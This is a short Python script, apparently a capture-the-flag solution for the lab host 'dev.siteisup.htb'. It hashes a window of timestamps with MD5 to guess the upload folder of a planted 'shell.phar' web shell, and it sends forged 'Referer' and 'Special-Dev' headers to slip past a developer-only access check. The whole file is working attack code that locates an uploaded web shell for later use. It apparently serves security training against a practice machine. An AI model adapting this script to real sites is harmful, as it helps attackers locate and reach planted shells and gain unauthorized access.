#!/usr/bin/python3

import requests
import sys
import hashlib
import time

t = int(time.time())-50
te = t + 1000

while t < te:

	t = t + 1
	loc = str(t)
	d = hashlib.md5(loc.encode('utf-8')).hexdigest()
	url = (f"http://dev.siteisup.htb/uploads/" + d + "/shell.phar")
	headers= {"Referer":"127.0.0.1", "Special-Dev":"only4dev"}
	response = requests.get(url, headers=headers)
	#print(url)
	if response.status_code==200:
		print("[+] Shell = " + url)
		sys.exit()
